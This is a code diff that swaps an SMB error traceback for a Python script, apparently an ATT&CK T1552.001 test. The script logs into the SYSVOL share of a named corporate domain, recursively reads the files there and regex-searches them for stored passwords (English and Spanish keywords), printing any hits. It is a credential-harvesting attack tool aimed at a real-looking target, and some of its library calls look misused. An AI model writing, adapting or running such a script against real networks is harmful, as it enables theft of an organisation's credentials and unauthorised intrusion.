@@ -1,13 +1,75 @@
-Traceback (most recent call last):
-  File "C:\Users\echaconn\Downloads\T1552_01.py", line 54, in <module>
-    main()
-  File "C:\Users\echaconn\Downloads\T1552_01.py", line 44, in main
-    connection, session, tree = connect_to_smb(server, share, username, password)
-  File "C:\Users\echaconn\Downloads\T1552_01.py", line 15, in connect_to_smb
-    tree.connect()
-  File "C:\Users\echaconn\AppData\Roaming\Python\Python310\site-packages\smbprotocol\tree.py", line 248, in connect
-    response = self.session.connection.receive(request)
-  File "C:\Users\echaconn\AppData\Roaming\Python\Python310\site-packages\smbprotocol\connection.py", line 1100, in receive
-    raise SMBResponseException(response)
-smbprotocol.exceptions.InvalidParameter: Received unexpected status from the server: An invalid parameter was passed to a service or function. (3221225485) STATUS_INVALID_PARAMETER: 0xc000000d
+import re
+import uuid
+from smbprotocol.connection import Connection
+from smbprotocol.session import Session
+from smbprotocol.tree import TreeConnect
+from smbprotocol.open import Open, CreateOptions
+from smbprotocol.exceptions import SMBException
 
+def connect_to_smb(server, share, username, password):
+    try:
+        print(f"Connecting to SMB server: {server}")
+        connection = Connection(uuid.uuid4(), server)
+        connection.connect()
+        print("Connection established.")
+        
+        print(f"Authenticating as user: {username}")
+        session = Session(connection, username, password)
+        session.connect()
+        print("Session established.")
+        
+        print(f"Connecting to share: {share}")
+        tree = TreeConnect(session, share)
+        tree.connect()
+        print("Share connected.")
+        return connection, session, tree
+    except SMBException as e:
+        print(f"Failed to connect to SMB share: {e}")
+        raise
+
+def search_files(connection, session, tree, path, pattern):
+    tree_path = f"\\{path}"
+    try:
+        print(f"Opening directory: {tree_path}")
+        dir_handle = Open(tree, tree_path, "r", options=CreateOptions.FILE_DIRECTORY_FILE)
+    except SMBException as e:
+        print(f"Failed to open directory {tree_path}: {e}")
+        return
+
+    for file_info in dir_handle.query_directory("*"):
+        filename = file_info["file_name"]
+        if file_info["is_directory"]:
+            search_files(connection, session, tree, f"{path}\\{filename}", pattern)
+        else:
+            file_handle = Open(tree, f"{path}\\{filename}", "r")
+            try:
+                content = file_handle.read(1024 * 64).decode('utf-8', errors='ignore')
+                matches = re.findall(pattern, content)
+                if matches:
+                    print(f"Found matches in {path}\\{filename}: {matches}")
+            finally:
+                file_handle.close()
+    dir_handle.close()
+
+def main():
+    server = "uio.bpichincha.com"
+    share = "\\uio.bpichincha.com\\SYSVOL\\uio.bpichincha.com"
+    username = "your_username"
+    password = "your_password"
+    search_pattern = r"(password|pwd|pass|contraseña|clave)\s*=\s*['\"]?(\w+)['\"]?"
+
+    try:
+        connection, session, tree = connect_to_smb(server, share, username, password)
+    except SMBException:
+        print("Exiting due to connection failure.")
+        return
+
+    try:
+        search_files(connection, session, tree, "", search_pattern)
+    finally:
+        tree.disconnect()
+        session.disconnect()
+        connection.disconnect()
+
+if __name__ == "__main__":
+    main()
